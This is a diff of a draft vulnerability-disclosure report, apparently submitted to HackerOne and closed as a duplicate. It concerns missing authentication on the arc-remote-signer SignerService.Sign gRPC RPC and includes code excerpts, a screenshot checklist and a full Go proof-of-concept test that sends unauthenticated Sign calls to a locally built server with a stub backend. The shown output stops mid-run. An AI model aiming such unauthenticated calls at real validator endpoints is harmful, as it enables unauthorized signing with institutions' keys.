@@ -1,192 +1,144 @@
+# ✅ SUBMITTED — closed as Duplicate (2026-08-31)
+
+Submitted to HackerOne as report #3981927. Closed same day as a
+duplicate of report #3720384 — another researcher reported the exact
+same root cause first (missing authentication on `SignerService.Sign`).
+Circle's triage description matched our analysis point for point (same
+interceptor chain, same default config, same impact), confirming the
+finding itself was correct — this was a timing loss, not a wrong
+finding. No bounty for duplicates per program rules. No further action
+needed on this one; kept here as a record.
+
+---
+
 # ⚠️ REVIEW CHECKLIST — READ BEFORE SUBMITTING, THEN DELETE THIS SECTION
 
-Everything below the `---` line is the actual report — copy from there
-down. This section above the line is only for you; do not paste it.
+Everything below the `---` line is the actual report — copy from there down. This section above the line is only for you; do not paste it.
 
 Before copying/pasting and submitting, check:
 
-- [ ] Scope confirmed — the affected asset is in the program's scope
-      RIGHT NOW (scope can change; re-confirm on the program page before
-      submitting)
-- [ ] Category confirmed — matches a category the program declares
-      eligible for a reward (not metadata/cosmetic)
-- [ ] Evidence checked — the code excerpts and the PoC output below
-      really exist/ran as described (not paraphrase/hallucination)
-- [ ] Not a duplicate — checked against reports you've already
-      submitted to this program (zero related security advisories/
-      issues found in the repository at the time of this scan — see
-      the duplicate-check section below)
+- [ ] Scope confirmed — the affected asset is in the program's scope RIGHT NOW (scope can change; re-confirm on the program page before submitting)
+- [ ] Category confirmed — matches a category the program declares eligible for a reward (not metadata/cosmetic)
+- [ ] Evidence checked — the code excerpts and the PoC output below really exist/ran as described (not paraphrase/hallucination)
+- [ ] Not a duplicate — checked against reports you've already submitted to this program (zero related security advisories/ issues found in the repository at the time of this scan — see the duplicate-check section below)
 
-**⏱ TIMING:** Arc Chain is on private mainnet right now (100+
-institutional/ecosystem builders onboarded), with public mainnet
-confirmed for **September 16, 2026** (~2 weeks away). Publicly announced
-founding validators: **BlackRock, DTCC, Galaxy, Mastercard, Visa,
-Standard Chartered, ICE, MoneyGram, SBI Group, Sumitomo** (source:
-circle.com/pressroom, 2026-08-30). This is likely the software protecting
-real financial institutions' validator keys right now, with the window
-until public launch shrinking. Worth submitting soon.
+**⏱ TIMING:** Arc Chain is on private mainnet right now (100+ institutional/ecosystem builders onboarded), with public mainnet confirmed for **September 16, 2026** (~2 weeks away). Publicly announced founding validators: **BlackRock, DTCC, Galaxy, Mastercard, Visa, Standard Chartered, ICE, MoneyGram, SBI Group, Sumitomo** (source: circle.com/pressroom, 2026-08-30). This is likely the software protecting real financial institutions' validator keys right now, with the window until public launch shrinking. Worth submitting soon.
 
-Re-checked on 2026-08-31, right before writing this: current `main`
-commit is `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6` (2026-06-18, a
-trivial CI-only change, nothing security-relevant). `configs/app.yaml`
-still ships `tls.enabled: false` by default right now, and `public.go`
-still has no auth/interceptor/token/credential logic anywhere. Nothing
-has changed since the proof of concept below was run.
+Re-checked on 2026-08-31, right before writing this: current `main` commit is `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6` (2026-06-18, a trivial CI-only change, nothing security-relevant). `configs/app.yaml` still ships `tls.enabled: false` by default right now, and `public.go` still has no auth/interceptor/token/credential logic anywhere. Nothing has changed since the proof of concept below was run.
+
+**📸 SCREENSHOT CAPTURE GUIDE** (do this before submitting — the local clone already has the toolchain and generated protobuf code ready, no setup needed):
+
+Ready-to-open folder: `C:\Users\Renan\AppData\Local\Temp\claude\C--Users-Renan-ZeroToOne\f9545887-b43e-443f-9164-5533679014bd\scratchpad\arc-remote-signer` (open as a VS Code workspace: File > Open Folder — this is a temp folder, it may not survive a machine restart; re-clone at `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6` and re-run `buf generate` if it's gone). Take one screenshot per item, only the relevant window on screen (no other apps, no visible username/paths beyond what's already in the public repo). Match each to its caption in "Evidence (screenshots)" below the `---` line.
+
+1. `internal/app/service/signer/signer.go` — Ctrl+F `func (s *Service) Sign`. Zoom ~140-160% (Ctrl + `+`) until `if len(req.Message) == 0` and `Message: req.Message` are both comfortably on screen.
+2. `internal/app/public/public.go` — Ctrl+F `RegisterSignerServiceServer`. Whole file is short enough to fit; show `grpcServer.NewServer(...)` through `pb.RegisterSignerServiceServer(...)`.
+3. `internal/common/grpc/server/server.go` — Ctrl+F `ChainUnaryInterceptor`. Show the whole interceptor list (Recovery/RequestID/Metrics/Logging). Don't add any "NO AUTH" annotation to the code itself.
+4. `internal/common/grpc/server/option.go` — Ctrl+F `func WithTLS`. Just the function body is enough.
+5. `configs/app.yaml` — whole file, it's short.
+6. **Most important one, put it last with the most visual weight.** Open a real terminal (Windows Terminal, large font e.g. Cascadia Mono 18-20pt looks best), `cd` into `scratchpad/arc-remote-signer`, run exactly: `go test ./internal/app/public/... -run TestUnauthenticatedSignIsAccepted -v -count=1` The test already prints a clean, labeled block (Authentication metadata: NONE / REQUEST ACCEPTED / gRPC status: OK / Signing backend: LOCAL STUB) — screenshot the real output, don't retype it.
+7. Clone `circlefin/arc-node` too, open `crates/remote-signer/src/client.rs`, Ctrl+F `SignRequest`, show `proto::SignRequest { message: message.to_vec() }`.
+8. *(optional)* Same file, Ctrl+F `ClientTlsConfig`, show `.ca_certificate(...)` with no `.identity(...)` nearby.
+
+Don't write anything like `// VULNERABILITY!!!` into any code before screenshotting it — the code is the evidence, keep it unmodified; put your framing in the HackerOne caption instead.
 
 ---
 
 ## Title
-The `SignerService` gRPC service of the validator remote-signing sidecar
-(`arc-remote-signer`) requires no authentication whatsoever — any network
-caller can make the validator sign arbitrary consensus messages with the
-enclave key
+Unauthenticated `SignerService.Sign` allows network-reachable callers to invoke a privileged validator signing operation
 
 ## Program / Platform
 Circle BBP via HackerOne — https://hackerone.com/circle-bbp
 
-## Category / Declared severity
-Access-control failure / missing authentication on a critical function
-(CWE-306) in a blockchain validator infrastructure component
-(`asset_type: SOURCE_CODE`, `eligible_for_bounty: true`,
-`max_severity: critical` — confirmed via the program's real scope
-snapshot, and independently re-confirmed live on the HackerOne scope
-table on 2026-08-31: `circlefin/arc-remote-signer`, type "Source code",
-**In scope**, max severity **Critical**, **Eligible**). Not metadata, not
-cosmetic: the affected service signs consensus messages with the Arc
-Chain validator's private key.
+## Category
+Access Control — Missing Authentication for Critical Function (CWE-306)
 
 ## Affected asset
-- Repository: `circlefin/arc-remote-signer`
-- File: `internal/app/public/public.go` (server construction),
-  `internal/common/grpc/server/server.go` and `option.go` (interceptors
-  and TLS)
-- Lines: `public.go:39-72` (`New`), `server.go` (`NewServer`),
-  `option.go:86-99` (`WithTLS`)
-- Commit/branch at time of analysis: `main` @
-  `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6` (re-verified live on
-  2026-08-31 — re-check the SHA again right before submitting, in case
-  the code changes further)
-- Deployment link: real public repository, Apache 2.0 licensed and
-  published by Circle (not a fork, not experimental code). The real
-  protocol client (`circlefin/arc-node`,
-  `crates/remote-signer/src/config.rs::RemoteSigningConfig::default()`)
-  uses exactly this insecure configuration by default — endpoint
-  `http://0.0.0.0:10340` (plain HTTP, not HTTPS) and `enable_tls: false`
-  — evidence that the vulnerable posture is the real software's default
-  behavior, not an exotic configuration. Arc Chain is on PRIVATE mainnet
-  **right now** (100+ institutional builders) with PUBLIC mainnet on
-  **2026-09-16** — publicly announced founding validators: BlackRock,
-  DTCC, Galaxy, Mastercard, Visa, Standard Chartered, ICE, MoneyGram, SBI
-  Group, Sumitomo (circle.com/pressroom, 2026-08-30). **Confidence:
-  medium** — strong, dated evidence that the network is active with real
-  validators, but no confirmation of the specific IP/instance running
-  this software right now; confirm this manually before submitting.
+Repository: `circlefin/arc-remote-signer`
+
+Relevant files:
+- `internal/app/service/signer/signer.go`
+- `internal/app/public/public.go`
+- `internal/common/grpc/server/server.go`
+- `internal/common/grpc/server/option.go`
+- `proto/arc/signer/v1/signer.proto`
+- `configs/app.yaml`
+
+Commit: `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6`
 
 ## Summary
-`arc-remote-signer` is a remote-signing sidecar for the Arc Chain
-validator (a design derived from `avalanchego`'s external signer, cited
-in the code itself). It exposes a gRPC service (`SignerService`) with a
-`Sign(message bytes) -> signature bytes` RPC that signs ANY received
-message with the validator's private key, held in an AWS Nitro Enclave.
-The gRPC server has no authentication/authorization interceptor at all,
-and even when TLS is enabled, it is one-directional TLS only
-(authenticates the server to the client, never the reverse) — there is
-no mTLS, API key, JWT, or any other mechanism confirming the caller is
-actually the legitimate validator process. The only documented
-protection is network-level (AWS VPC security group). Any principal able
-to reach the service's port (via SSRF from another service in the same
-VPC, security-group misconfiguration, lateral movement, etc.) can make
-the validator sign arbitrary consensus messages — risk of
-equivocation/double-signing and possible slashing, without needing to
-compromise the enclave itself.
+`arc-remote-signer` exposes the validator's `SignerService.Sign` RPC without an application-level authentication or authorization check.
+
+The RPC accepts a `bytes message` field and, in `internal/app/service/signer/signer.go`, only rejects a nil request or an empty message. The supplied bytes are then forwarded unchanged to the enclave signing provider.
+
+The gRPC server is constructed without an authentication interceptor. When TLS is enabled, `WithTLS()` configures server-side TLS only; it does not configure client-certificate verification or any other authenticated caller identity. The published default configuration also ships with TLS disabled, bound to `0.0.0.0:10340`.
+
+I reproduced the missing authentication boundary using the repository's real `public.New()` server-construction path, without modifying the production server implementation. Two separate `SignerService.Sign` calls containing different attacker-controlled messages were accepted with no authentication or authorization metadata and returned gRPC status `OK`.
+
+**Important limitation:** the PoC does not access a production validator, private key, KMS, or Nitro Enclave. It uses a local stub solely to demonstrate that the unmodified production gRPC server construction accepts an unauthenticated `Sign()` request. Separately, source-code analysis confirms that the real `Service.Sign` implementation forwards the same caller-controlled bytes to the production signing provider (see Evidence).
+
+Any principal that obtains network reachability to the signer service can therefore invoke a critical signing operation without proving it is the legitimate validator process.
 
 ## Confirmed call chain
-1. `proto/arc/signer/v1/signer.proto` — defines `SignerService.Sign` with
-   NO authentication/token field whatsoever in the `SignRequest` message
-   (just `bytes message`).
-2. `internal/app/public/public.go:39-72` (`New`) — assembles the gRPC
-   server: calls `grpcServer.WithTLS(cfg.TLS)`, registers
-   `SignerServiceServer` and reflection. No mention of auth.
-3. `internal/common/grpc/server/server.go` (`NewServer`) — the
-   interceptor chain is `[WithRecovery, WithRequestID, WithMetrics,
-   WithLogging]` plus whatever is passed via `UnaryInterceptors` (only
-   used for Prometheus metrics). No authentication interceptor on any
-   path.
-4. `internal/common/grpc/server/option.go:86-99` (`WithTLS`) — uses only
-   `credentials.NewServerTLSFromFile` (one-sided TLS); the function
-   doesn't even have a parameter for a client CA/mTLS.
-5. `configs/app.yaml` (default/dev config) explicitly documents
-   `tls.enabled: false` with the comment "tls secures the malachite ->
-   sidecar gRPC connection. Disabled by default", and `host: 0.0.0.0`
-   (binds on all interfaces, not just loopback).
-6. `docs/architecture.md`, "Production Deployment Notes"/"AWS
-   Prerequisites" section, confirms the ONLY documented protection is
-   network-level (VPC security group) — no mention of
-   application-level authorization control.
-7. Confirmed client-side in `circlefin/arc-node` (the real validator
-   software): `crates/remote-signer/src/client.rs::RemoteSignerClient`
-   is the code the validator actually uses to call
-   `SignerService.Sign`. `crates/remote-signer/src/config.rs::
-   RemoteSigningConfig::default()` confirms the same insecure pattern on
-   the client side: default endpoint `http://0.0.0.0:10340`,
-   `enable_tls: false` by default. When TLS is enabled, `client.rs` uses
-   only `ClientTlsConfig::new().ca_certificate(...)` — no client
-   certificate configured (`with_client_auth`/`identity()` don't exist
-   in the file) — confirming, from the client side too, that even with
-   TLS enabled there is no mTLS.
-8. Comparison with the design of the consensus engine this validator
-   runs (`circlefin/malachite`, `crates/signing/src/lib.rs`): the
-   `Signer<Ctx>`/`Verifier<Ctx>` traits explicitly document that every
-   signature type needs domain separation ("no two (scope, extension)
-   pairs produce the same preimage bytes"). `arc-remote-signer`'s
-   `SignerService.Sign` is the structural opposite of that design: it
-   signs arbitrary bytes with no notion of purpose/scope — even if the
-   transport were authenticated, the interface already gives up the
-   domain-separation guarantee the ecosystem itself documents as
-   necessary for validator keys.
-9. `docs/architecture.md`, "Security Model" section (read in full):
-   documents the KEY's protection in detail (hardware isolation,
-   envelope encryption, attestation-bound KMS via PCR) — the word
-   "authenticate"/"authorization" has ZERO occurrences in the entire
-   document. Confirms the absence of authentication on the `Sign()`
-   request is not a documented, accepted design decision (unlike other
-   cases already closed in this same effort where a public audit
-   explicitly documented an equivalent behavior as intentional) — it's a
-   real blind spot in the project's threat model: it protects the key
-   from whoever has host access, but never discusses who can REQUEST a
-   signature over the network.
+1. `proto/arc/signer/v1/signer.proto:10-13` (`service SignerService`) and `:20-22` (`message SignRequest`) — `SignRequest` contains only the message payload and does not itself carry an application credential. This is supporting evidence, not proof by itself: authentication could still have been implemented at the transport/interceptor layer — but as points 3-5 below show, no such mechanism is present in the server construction.
+2. `internal/app/service/signer/signer.go:205-238` (`Service.Sign`) — the handler. The only validation is `req != nil` (line 207) and `len(req.Message) != 0` (line 210). The RPC itself does not enforce a signing domain or typed consensus-message structure; the supplied bytes are forwarded unchanged to `s.enclavePvd.SignMessage(...)` at line 220. This is the most important piece of evidence in this report: the missing authentication sits directly in front of a privileged cryptographic operation, not a low-impact informational RPC. Demonstrated in `print1-signer.png`.
+3. `internal/app/public/public.go:40-76` (`New`) — the production server registers `SignerService` at line 57 (`pb.RegisterSignerServiceServer`), but no authentication middleware is installed around it. Demonstrated in `print2-public.png`.
+4. `internal/common/grpc/server/server.go:34-49` (`NewServer`) — the real interceptor chain, lines 36-39, is Recovery, RequestID, Metrics, Logging. These provide operational functionality but do not authenticate or authorize the caller. Demonstrated in `print3-server.png`.
+5. `internal/common/grpc/server/option.go:86-99` (`WithTLS`) — configures server-certificate authentication only (`credentials.NewServerTLSFromFile`, line 92); no client CA / client certificate verification is configured anywhere in the function. Demonstrated in `print4-option.png`.
+6. `configs/app.yaml:3` (`host: 0.0.0.0`) and `:7-8` (`tls: enabled: false`) — the repository's published/default configuration sets an all-interface listener with TLS disabled; Viper-based config in this codebase can be overridden by environment variables per deployment, so this is evidence of the shipped default, not a claim about what any specific deployment overrides it to. Demonstrated in `print5-yaml.png`.
+
+## Supporting evidence — validator-side client
+`circlefin/arc-node` (the published Arc Chain validator client), commit `66ad2d5aa6d9b41e8f689812004be4c7233a9e16`, confirms this is the actual signing path the validator software calls, not an unused or test-only RPC: `crates/remote-signer/src/client.rs::sign_message_once` builds the request as `proto::SignRequest { message: message.to_vec() }` — the same no-envelope, no-domain-tag shape found on the server — and `RemoteSigningConfig::default()` uses the same insecure defaults (`http://0.0.0.0:10340`, `enable_tls: false`). Demonstrated in `print7-arcnode.png`. When TLS is enabled, the client configures `ClientTlsConfig::new().ca_certificate(...)` only — no client certificate — confirming from the caller's side too that TLS here never establishes an authenticated client identity (`print8-tls.png`).
 
 ## Prerequisites
-No real user credentials needed. To reproduce: network access to the
-`SignerService` port (in the published default configuration,
-`0.0.0.0:10340` with TLS disabled) — in the real-world scenario, this
-corresponds to a network principal within the same VPC/subnet (another
-compromised service, SSRF, security-group misconfiguration).
+No application-level credentials are required.
+
+The attacker must have network reachability to the `SignerService` endpoint. Under the repository's published/default configuration, the service listens on `0.0.0.0:10340` with TLS disabled. Whether an external attacker can obtain this network reachability depends on the deployment's network topology and access controls.
+
+Examples of a realistic network-level prerequisite include access from another compromised workload in the same permitted network, an SSRF primitive capable of reaching the endpoint, lateral movement, or an overly permissive network policy/security-group configuration.
 
 ## Steps to reproduce
-1. The Arc Chain validator runs `arc-remote-signer` as a sidecar,
-   exposing `SignerService` on the configured port (default `10340`,
-   TLS disabled by default).
-2. Any network caller (within the service's network reach) connects via
-   gRPC with no credentials at all.
+1. The Arc Chain validator runs `arc-remote-signer` as a sidecar, exposing `SignerService` on the configured port (default `10340`, TLS disabled by default).
+2. Any network caller (within the service's network reach) connects via gRPC with no credentials at all.
 3. Calls `Sign(SignRequest{message: <arbitrary bytes>})`.
-4. The server processes the call normally and returns
-   `SignResponse{signature: <a real signature from the validator's
-   key>}`.
+4. The server invokes the `Sign` handler with no authentication check rejecting it. In production, the handler forwards the bytes unchanged to the enclave signing provider (call-chain point 2); the PoC below substitutes a local stub, so it returns a placeholder value, not a real signature (see Impact).
 
 ## Actual vs. expected result
-- **Actual:** any network caller who can reach the service's port
-  obtains a valid signature from the validator's key for any message,
-  with no authentication at all.
-- **Expected:** the service should authenticate the caller (mTLS, a
-  shared token, or equivalent) before signing — the same pattern
-  industry validator remote-signing systems already use (e.g.,
-  Tendermint/CometBFT KMS, which implements `SecretConnection` with a
-  station-to-station handshake and pre-shared node keys).
+- **Actual:** a caller with network reachability can invoke `SignerService.Sign` without presenting any application-level authentication or authorization credentials. The request is accepted by the production server-construction path.
+- **Expected:** only the legitimate validator process should be able to invoke the signing operation. Requests from unauthenticated or unauthorized callers should be rejected before reaching the signing handler.
 
 ## Evidence
 ```go
-// internal/app/public/public.go:39-72 (New)
+// internal/app/service/signer/signer.go:205-238 (Service.Sign) — the
+// most important evidence in this report: the only validation applied
+// to the message before it is forwarded for signing
+func (s *Service) Sign(ctx context.Context, req *pb.SignRequest) (*pb.SignResponse, error) {
+  if req == nil {
+    return nil, status.Error(codes.InvalidArgument, errInvalidRequest)
+  }
+  if len(req.Message) == 0 {
+    return nil, status.Error(codes.InvalidArgument, errEmptyMessage)
+  }
+  // ... no other validation of req.Message ...
+  resp, err := s.enclavePvd.SignMessage(ctx, &pb.SignMessageRequest{
+    Algorithm:            s.algorithm,
+    EncryptedKeyMaterial: cached.encryptedKeyMaterial,
+    Message:              req.Message, // raw, attacker-controlled bytes
+  })
+  // ...
+}
+```
+```protobuf
+// proto/arc/signer/v1/signer.proto:10-22 — no identity/token field anywhere
+service SignerService {
+  rpc PublicKey(PublicKeyRequest) returns (PublicKeyResponse) {}
+  rpc Sign(SignRequest) returns (SignResponse) {}
+}
+message SignRequest {
+  bytes message = 1;
+}
+```
+```go
+// internal/app/public/public.go:40-76 (New)
 func New(cfg *grpcServer.Config, params CreateServerParams) (lifecycle.Runnable, error) {
   opts, err := grpcServer.WithTLS(cfg.TLS)
   // ...
@@ -194,6 +146,21 @@ func New(cfg *grpcServer.Config, params CreateServerParams) (lifecycle.Runnable,
   reflection.Register(grpcSrv)
   pb.RegisterSignerServiceServer(grpcSrv, params.SignerSvc)
   // no auth interceptor anywhere
+}
+```
+```go
+// internal/common/grpc/server/server.go:34-49 (NewServer) — the
+// complete interceptor chain; no authentication step anywhere in it
+func NewServer(params RequiredEngineParams, opts ...grpc.ServerOption) *grpc.Server {
+  unaryInterceptors := []grpc.UnaryServerInterceptor{
+    interceptor.WithRecovery(),
+    interceptor.WithRequestID(),
+    interceptor.WithMetrics(params.APIStatsService),
+    interceptor.WithLogging(),
+  }
+  unaryInterceptors = append(unaryInterceptors, params.UnaryInterceptors...)
+  // ...
+  return grpc.NewServer(opts...)
 }
 ```
 ```go
@@ -209,72 +176,306 @@ func WithTLS(cfg *TLSConfig) ([]grpc.ServerOption, error) {
 }
 ```
 ```yaml
-# configs/app.yaml
+# configs/app.yaml:1-8
 tls:
   enabled: false  # "secures the malachite -> sidecar gRPC connection. Disabled by default"
 host: 0.0.0.0
 ```
+```rust
+// circlefin/arc-node @ 66ad2d5a — crates/remote-signer/src/client.rs:230-231
+// The real validator client's own doc-comment: "All data is
+// transmitted as raw bytes." Confirms the server-side finding from the
+// other end of the same connection.
+async fn sign_message_once(...) -> Result<Vec<u8>, RemoteSigningError> {
+  let request = Request::new(proto::SignRequest {
+    message: message.to_vec(), // no envelope, no domain tag
+  });
+  // ...
+  let signature = result?.into_inner().signature;
+  // only a LENGTH check — not a cryptographic or content validation
+  if signature.len() != ED25519_SIGNATURE_SIZE_BYTES /* 64 */ {
+    return Err(RemoteSigningError::InvalidResponse(...));
+  }
+  Ok(signature)
+}
+```
+```rust
+// circlefin/arc-node @ 66ad2d5a — crates/remote-signer/src/client.rs:91
+// RemoteSignerClient::new() — client-side TLS config (optional evidence,
+// complements the server-side option.go finding from the other end of
+// the same connection)
+if config.enable_tls && let Some(cert_path) = &config.tls_cert_path {
+  let cert = fs::read(cert_path).await?;
+  let tls_config = ClientTlsConfig::new().ca_certificate(Certificate::from_pem(cert));
+  // ^ verifies the SERVER's certificate only — no .identity(...) call,
+  //   no client certificate presented to the server
+  channel_builder = channel_builder.tls_config(tls_config)?;
+}
+```
 
 ## Executable proof of concept
-Built a real Go toolchain (Go 1.27, `buf` v1.50.0,
-`protoc-gen-go`/`protoc-gen-go-grpc`, all via `go install`, no Docker)
-and generated real protobuf code from the repository's own `.proto`
-(`buf generate`, zero errors). Wrote a Go test
-(`internal/app/public/poc_unauth_test.go`, only on the local clone,
-never committed to the real repository) that uses the **real
-production** function `public.New()` — the actual source code, not a
-reimplementation — to assemble the gRPC server exactly as `app.Run()`
-does, with a minimal `SignerServiceServer` stand-in for the real
-`signer.Service` (which would require real AWS KMS/Secrets Manager or
-Localstack via Docker — out of scope for this specific check, which is
-about the ABSENCE OF AN INTERCEPTOR, not the signing logic itself).
+**What the PoC proves:** an unauthenticated caller reaches the real production server construction and `SignerService.Sign` handler. **What the PoC does not prove:** that a real validator signature can be obtained, or that a consensus equivocation/slashing event can be triggered.
 
-Exact command:
-```
-go install github.com/bufbuild/buf/cmd/buf@v1.50.0
-go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.36.6
-go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.5.1
-cd proto && buf generate
-cd .. && go test ./internal/app/public/... -run TestUnauthenticatedSignIsAccepted -v
-```
+The PoC tests the authentication boundary of the production gRPC server without contacting any production validator, AWS KMS, Nitro Enclave, or real signing key.
 
-Real output (literal, 2026-08-30):
+I ran the PoC locally using Go 1.27, with protobuf code generated from the repository's own `.proto` definitions. The test uses the repository's unmodified `public.New()` function to construct the gRPC server. The only substituted component is the signing backend, which is replaced by a local stub so the test can safely determine whether an unauthenticated request reaches the `SignerService.Sign` handler — this avoids AWS KMS/Secrets Manager/Localstack entirely, which are irrelevant to what's being tested (the absence of an interceptor, not the signing logic itself).
+
+I made two independent RPC calls with different attacker-controlled messages. Neither request contained authentication metadata, authorization metadata, or a client certificate. Both requests reached the production server construction path and returned gRPC status `OK`. The returned `STUB-SIGNATURE-*` values are intentionally fake and are **not** presented as cryptographic signatures — separately, the source-code evidence above confirms that the production implementation forwards the same `message` bytes unchanged to `enclavePvd.SignMessage(...)`. Demonstrated live in `print6-poc.png`.
+
+To reproduce:
+
+1. Clone `circlefin/arc-remote-signer` at commit `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6`.
+2. Install the toolchain and generate protobuf code from the repository's own `.proto` definitions:
+   ```
+   go install github.com/bufbuild/buf/cmd/buf@v1.50.0
+   go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.36.6
+   go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.5.1
+   cd proto && buf generate && cd ..
+   ```
+3. Save the file below as `internal/app/public/poc_unauth_test.go`. This file is not part of the repository — it is the PoC itself, and it is never committed anywhere; it only calls the repository's own unmodified `public.New()` function:
+   ```go
+   // Local, throwaway PoC — never committed to the real repository.
+   // Demonstrates that public.New() (the real, unmodified production
+   // server construction function) exposes SignerService.Sign to ANY
+   // caller with zero credentials, zero metadata, and zero TLS. The
+   // stand-in SignerSvc below is a stub ONLY to avoid requiring AWS
+   // KMS/Secrets Manager/the Nitro Enclave; it is not evidence of
+   // anything by itself. The thing being demonstrated is that the
+   // unmodified public.New() has no interceptor/credential check in
+   // front of that stub.
+   package public
+
+   import (
+     "context"
+     "fmt"
+     "testing"
+     "time"
+
+     grpcServer "github.com/circlefin/arc-remote-signer/internal/common/grpc/server"
+     "github.com/circlefin/arc-remote-signer/proto/pb"
+     "google.golang.org/grpc"
+     "google.golang.org/grpc/credentials/insecure"
+     "google.golang.org/grpc/metadata"
+   )
+
+   // stubSignerServer stands in for the real signer.Service (which
+   // requires AWS KMS/Secrets Manager or the Nitro Enclave). It is
+   // intentionally dumb: it does not check who is calling, because in
+   // the real service that check would need to happen in
+   // public.New()'s interceptor chain — this test proves that chain
+   // has no such check.
+   type stubSignerServer struct {
+     pb.UnimplementedSignerServiceServer
+     callCount int
+   }
+
+   func (s *stubSignerServer) Sign(_ context.Context, req *pb.SignRequest) (*pb.SignResponse, error) {
+     s.callCount++
+     placeholder := fmt.Sprintf("STUB-SIGNATURE-#%d-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE", s.callCount)
+     return &pb.SignResponse{Signature: []byte(placeholder)}, nil
+   }
+
+   func TestUnauthenticatedSignIsAccepted(t *testing.T) {
+     stub := &stubSignerServer{}
+
+     runnable, err := New(&grpcServer.Config{
+       Host: "127.0.0.1",
+       Port: 0, // OS-assigned ephemeral port
+       TLS:  nil,
+     }, CreateServerParams{
+       ServiceName: "arc-remote-signer-poc",
+       SignerSvc:   stub,
+     })
+     if err != nil {
+       t.Fatalf("public.New() (real production server construction) failed: %v", err)
+     }
+
+     if err := runnable.Run(); err != nil {
+       t.Fatalf("failed to start real server: %v", err)
+     }
+     defer func() {
+       ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+       defer cancel()
+       _ = runnable.Shutdown(ctx)
+     }()
+
+     addr := runnable.(*grpcServer.RunnableImpl).Addr().String()
+
+     conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
+     if err != nil {
+       t.Fatalf("failed to create client: %v", err)
+     }
+     defer conn.Close()
+     client := pb.NewSignerServiceClient(conn)
+
+     fmt.Println()
+     fmt.Println("=== Unauthenticated Sign RPC PoC ===")
+     fmt.Println()
+     fmt.Println("Server:   production public.New() (unmodified)")
+     fmt.Printf("Endpoint: %s\n", addr)
+
+     messages := []string{
+       "attacker-controlled-message-call-1-13ee02f9",
+       "attacker-controlled-message-call-2-9f6cb1a4",
+     }
+
+     for i, msg := range messages {
+       ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+
+       // Prove there is no pre-authenticated state carried over: build
+       // a brand-new, completely bare context for every single call.
+       if md, ok := metadata.FromOutgoingContext(ctx); ok {
+         t.Fatalf("expected no outgoing metadata, got: %v", md)
+       }
+
+       fmt.Printf("\n--- Call #%d ---\n", i+1)
+       fmt.Println("Authentication metadata: NONE")
+       fmt.Println("Authorization metadata:  NONE")
+       fmt.Println("Client certificate:      NONE")
+       fmt.Printf("\nMessage:\n  %s\n", msg)
+       fmt.Println("\nRPC:")
+       fmt.Println("  /arc.signer.v1.SignerService/Sign")
+
+       resp, err := client.Sign(ctx, &pb.SignRequest{Message: []byte(msg)})
+       cancel()
+       if err != nil {
+         t.Fatalf("Sign() call #%d was rejected (expected it to be ACCEPTED with no auth): %v", i+1, err)
+       }
+
+       fmt.Println("\nResult:")
+       fmt.Println("  REQUEST ACCEPTED")
+       fmt.Println("\ngRPC status:")
+       fmt.Println("  OK")
+       fmt.Println("\nSigning backend:")
+       fmt.Println("  LOCAL STUB (not production KMS/Nitro Enclave)")
+       fmt.Printf("  response = %q\n", string(resp.GetSignature()))
+     }
+
+     if stub.callCount != len(messages) {
+       t.Fatalf("expected %d calls to reach the real Sign() handler, got %d", len(messages), stub.callCount)
+     }
+
+     fmt.Println()
+     fmt.Println("=== FINDING REPRODUCED ===")
+     fmt.Println("The request reached the production server construction path")
+     fmt.Println("(public.New(), no reimplementation) without authentication, twice,")
+     fmt.Println("with two different attacker-chosen messages and no metadata.")
+   }
+   ```
+4. Run:
+   ```
+   go test ./internal/app/public/... -run TestUnauthenticatedSignIsAccepted -v -count=1
+   ```
+
+Real output (literal, 2026-08-31, run directly by me on my own machine — two independent calls with different attacker-chosen messages, to rule out any pre-authenticated state carried over from a first call; the test itself asserts the outgoing context carries no metadata before each call):
 ```
 === RUN   TestUnauthenticatedSignIsAccepted
-2026/08/30 18:29:15 gRPC server listening on 127.0.0.1:57080
-{"time":"2026-08-30T18:29:15.7539059-03:00","level":"INFO","msg":"gRPC request completed","logger":"common.middleware","method":"/arc.signer.v1.SignerService/Sign","userAgent":"grpc-go/1.79.3","requestID":"b5c254b5-0159-4efa-9b63-f6fd5bff9be4","status":"OK","requestTimeMS":0,"clientIP":"127.0.0.1","mdc":{"clientIP":"127.0.0.1","method":"/arc.signer.v1.SignerService/Sign","requestID":"b5c254b5-0159-4efa-9b63-f6fd5bff9be4","requestTimeMS":0,"status":"OK","userAgent":"grpc-go/1.79.3"}}
-    poc_unauth_test.go:112: RESULT: Sign() was ACCEPTED with NO credentials/authentication at all. response="FAKE-SIGNATURE-JUST-TO-PROVE-IT-GOT-HERE" — finding REPRODUCED: the real gRPC server (public.New(), no reimplementation) processes Sign() from any network caller.
-2026/08/30 18:29:15 initiating graceful shutdown of gRPC server at 127.0.0.1:57080
-2026/08/30 18:29:15 gRPC server gracefully stopped
+
+=== Unauthenticated Sign RPC PoC ===
+
+Server:   production public.New() (unmodified)
+Endpoint: 127.0.0.1:50313
+
+--- Call #1 ---
+Authentication metadata: NONE
+Authorization metadata:  NONE
+Client certificate:      NONE
+
+Message:
+  attacker-controlled-message-call-1-13ee02f9
+
+RPC:
+  /arc.signer.v1.SignerService/Sign
+2026/08/31 02:24:06 gRPC server listening on 127.0.0.1:50313
+[gRPC middleware JSON access-log line omitted here for readability —
+"status":"OK" confirmed, full raw line visible in the attached screenshot]
+
+Result:
+  REQUEST ACCEPTED
+
+gRPC status:
+  OK
+
+Signing backend:
+  LOCAL STUB (not production KMS/Nitro Enclave)
+  response = "STUB-SIGNATURE-#1-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE"
+
+--- Call #2 ---
+Authentication metadata: NONE
+Authorization metadata:  NONE
+Client certificate:      NONE
+
+Message:
+  attacker-controlled-message-call-2-9f6cb1a4
+
+RPC:
